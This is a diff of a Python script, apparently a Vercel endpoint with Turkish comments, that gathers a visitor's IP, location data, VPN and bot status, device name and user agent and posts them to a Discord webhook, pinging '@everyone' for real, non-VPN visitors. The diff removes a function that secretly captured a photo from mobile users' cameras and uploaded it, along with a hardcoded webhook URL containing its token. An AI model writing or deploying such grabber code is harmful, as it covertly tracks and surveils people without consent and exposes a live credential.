@@ -3,7 +3,7 @@ import json
 import platform
 import socket
 from datetime import datetime
-import cv2  # For camera access
+import os  # For environment variables
 
 def handler(request):
     # Mesaj döndür
@@ -25,7 +25,9 @@ def get_ip_details():
 # VPN detection using IPHunter API
 def get_vpn_status(ip):
     try:
-        api_key = 'YOUR_IPHUNTER_API_KEY'  # Replace with your IPHunter API key
+        api_key = os.getenv('IPHUNTER_API_KEY')  # Secure API key through environment variables
+        if not api_key:
+            return "API key missing"
         response = requests.get(f'https://www.iphunter.info:8082/v1/ip/{ip}?key={api_key}')
         data = response.json()
         if data['block'] == 1:
@@ -37,29 +39,23 @@ def get_vpn_status(ip):
         return "Unknown"
 
 # Send message to Discord Webhook
-def send_to_discord(webhook_url, embed, file=None, mention_everyone=False):
+def send_to_discord(webhook_url, embed, mention_everyone=False):
     data = {
         "embeds": [embed]
     }
     if mention_everyone:
         data["content"] = "@everyone"
 
-    if file:
-        try:
-            response = requests.post(webhook_url, json=data, files={'file': file})
-        except Exception as e:
-            print(f"Error sending file to Discord: {e}")
-    else:
-        try:
-            response = requests.post(webhook_url, json=data)
-            if response.status_code == 204:
-                print("Message sent successfully!")
-            else:
-                print(f"Error: {response.status_code} - {response.text}")
-        except Exception as e:
-            print(f"Error sending message to Discord: {e}")
+    try:
+        response = requests.post(webhook_url, json=data)
+        if response.status_code == 204:
+            print("Message sent successfully!")
+        else:
+            print(f"Error: {response.status_code} - {response.text}")
+    except Exception as e:
+        print(f"Error sending message to Discord: {e}")
 
-# Get User Agent
+# Get User Agent (client-side logic that may not work in Vercel)
 def get_user_agent():
     try:
         response = requests.get('https://httpbin.org/user-agent')
@@ -80,24 +76,9 @@ def get_device_name():
     except:
         return "Unknown"
 
-# Capture a photo from the device's camera
-def capture_photo():
-    try:
-        cam = cv2.VideoCapture(0)
-        ret, frame = cam.read()
-        if ret:
-            cv2.imwrite('photo.jpg', frame)
-            cam.release()
-            return open('photo.jpg', 'rb')
-        cam.release()
-        return None
-    except Exception as e:
-        print(f"Error capturing photo: {e}")
-        return None
-
 if __name__ == "__main__":
-    webhook_url = "https://discord.com/api/webhooks/1192907455387140176/ZuUFZkK0Og9jaXz0tJP5-dU6jBz-doPMbNBhTd77OIchocmywP3G9oqJw6wqAN1kWoYJ"  # Replace with your webhook URL
-    
+    webhook_url = os.getenv('DISCORD_WEBHOOK_URL')  # Use environment variable for webhook URL
+
     ip_data = get_ip_details()
     
     if ip_data:
@@ -118,11 +99,6 @@ if __name__ == "__main__":
         mobile_check = check_mobile(user_agent)
 
         current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-        # Check if it's mobile and capture a photo
-        file_to_send = None
-        if mobile_check == "Yes":
-            file_to_send = capture_photo()
 
         # Add @everyone if not a bot and no VPN
         mention_everyone = vpn_status == "No" and bot_check == "No"
@@ -152,6 +128,6 @@ if __name__ == "__main__":
             }
         }
 
-        send_to_discord(webhook_url, embed, file=file_to_send, mention_everyone=mention_everyone)
+        send_to_discord(webhook_url, embed, mention_everyone=mention_everyone)
     else:
         print("Could not retrieve IP details.")
